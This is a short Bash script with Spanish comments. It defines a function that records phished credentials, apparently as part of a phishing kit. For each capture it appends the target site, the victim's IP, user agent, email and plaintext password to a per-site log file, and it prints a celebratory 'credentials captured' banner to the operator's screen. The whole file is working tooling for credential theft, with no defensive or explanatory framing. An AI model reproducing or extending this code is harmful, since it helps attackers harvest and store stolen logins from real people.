#!/bin/bash

log_credenciales() {
    local sitio=$1
    local email=$2
    local pass=$3
    local ip=$4
    local ua=$5
    
    mkdir -p logs
    local log_file="logs/${sitio}_creds.log"
    
    # Formato bonito para el log
    echo "════════════════════════════════════════════" >> "$log_file"
    echo "📅 Fecha: $(date '+%Y-%m-%d %H:%M:%S')" >> "$log_file"
    echo "🎯 Sitio: $sitio" >> "$log_file"
    echo "🌐 IP: $ip" >> "$log_file"
    echo "🖥️  User-Agent: $ua" >> "$log_file"
    echo "📧 Email/User: $email" >> "$log_file"
    echo "🔑 Password: $pass" >> "$log_file"
    echo "════════════════════════════════════════════" >> "$log_file"
    echo "" >> "$log_file"
    
    # Mostrar en pantalla
    echo -e "\n${R}════════════════════════════════════════════${NC}"
    echo -e "${G}🎯 ¡CREENCIALES CAPTURADAS!${NC}"
    echo -e "${R}════════════════════════════════════════════${NC}"
    echo -e "${Y}📧 Email:${W} $email"
    echo -e "${Y}🔑 Pass:${W} $pass"
    echo -e "${Y}🌐 IP:${W} $ip"
    echo -e "${R}════════════════════════════════════════════${NC}\n"
}
